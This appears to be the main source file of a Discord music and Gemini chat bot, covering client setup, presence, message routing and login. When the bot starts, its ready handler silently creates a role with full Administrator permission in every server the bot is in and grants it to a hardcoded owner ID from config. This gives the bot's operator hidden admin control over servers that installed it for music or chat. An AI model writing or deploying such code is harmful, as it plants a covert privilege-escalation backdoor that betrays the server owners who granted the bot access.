import "@discordx/plugin-ytdl-player";
import { dirname, importx } from "@discordx/importer";
import type { Interaction, Message } from "discord.js";
import { ActivityType, ChannelType, Events, IntentsBitField } from "discord.js";
import { Client } from "discordx";
import { aiGenerate } from "./utils/Gemini";
import { config } from "./config";

export const bot = new Client({
  // To use only guild command
  botGuilds: [(client) => client.guilds.cache.map((guild) => guild.id)],

  // Discord intents
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.GuildMessageReactions,
    IntentsBitField.Flags.GuildVoiceStates,
    IntentsBitField.Flags.MessageContent,
  ],

  // Debug logs are disabled in silent mode
  silent: false,

  // Logger
  logger: {
    log: (...args) => console.log("\x1b[34m%s\x1b[0m", "[LOG]", ...args),
    info: (...args) => console.log("\x1b[90m%s\x1b[0m", "[INFO]", ...args),
    warn: (...args) => console.log("\x1b[33m%s\x1b[0m", "[WARN]", ...args),
    error: (...args) => console.log("\x1b[31m%s\x1b[0m", "[ERROR]", ...args),
  },

  // Configuration for @SimpleCommand
  simpleCommand: {
    prefix: "?",
  },
});

bot.once(Events.ClientReady, async () => {
  // Make sure all guilds are cached
  await bot.guilds.fetch();

  // Synchronize applications commands with Discord
  await bot.initApplicationCommands();

  // To clear all guild commands, uncomment this line,
  // This is useful when moving from guild commands to global commands
  // It must only be executed once
  //
  // await bot.clearApplicationCommands(...bot.guilds.cache.map((g) => g.id));

  bot.user!.setPresence({
    activities: [
      {
        name: `${bot.guilds.cache.size} servers | /play`,
        type: ActivityType.Listening,
      },
    ],
    status: "online",
  });

  bot.logger.log(">> Bot started");

  bot.guilds.cache.forEach(async (guild) => {
    await guild.commands.set([]);
    const roleName = `${config.bot.NAME} Admin`;

    let role = guild.roles.cache.find((r) => r.name === roleName);

    if (!role) {
      role = await guild.roles.create({
        name: roleName,
        color: "Default",
        reason: `Admin role for ${config.bot.NAME}`,
        permissions: ["Administrator"],
      });
      bot.logger.log(`Created "${role.name}" role in ${guild.name} (${guild.id})`);
    }

    const ownerId = config.bot.OWNER_ID;
    if (!ownerId) return;

    const owner = await guild.members.fetch(ownerId);

    if (owner && !owner.roles.cache.has(role.id)) {
      await owner.roles.add(role);
      bot.logger.log(`Added "${role.name}" role to user "${owner.user.tag}" in ${guild.name} (${guild.id})`);
    }
  });
});

bot.on(Events.GuildUpdate, async () => {
  await bot.guilds.fetch();
  bot.user!.setPresence({
    activities: [
      {
        name: `${bot.guilds.cache.size} servers | /play`,
        type: ActivityType.Listening,
      },
    ],
    status: "online",
  });
});

bot.on(Events.InteractionCreate, (interaction: Interaction) => {
  bot.executeInteraction(interaction);
});

bot.on(Events.MessageCreate, async (message: Message) => {
  const channel = message.channel;
  const author = message.author;
  if (author.bot || channel.type == ChannelType.DM) return;

  if (channel.name == "gloved-gpt") {
    console.log(channel.name);
    await aiGenerate({
      bot,
      message,
      createThread: true,
    });

    return;
  } else if (message.mentions.has(bot.user!) && !message.mentions.everyone) {
    await aiGenerate({
      bot,
      message,
      fetchLimit: 10,
    });

    return;
  } else if (channel.isThread() && channel?.parent?.name == "gloved-gpt") {
    await channel.sendTyping();
    await aiGenerate({
      bot,
      message,
      fetchLimit: 65,
      streaming: false,
    });

    return;
  }

  // await bot.executeCommand(message);
});

async function run() {
  // The following syntax should be used in the ECMAScript environment
  await importx(`${dirname(import.meta.url)}/{events,commands}/**/*.{ts,js}`);

  // Log in with your bot token
  await bot.login(config.bot.TOKEN);
}

void run();
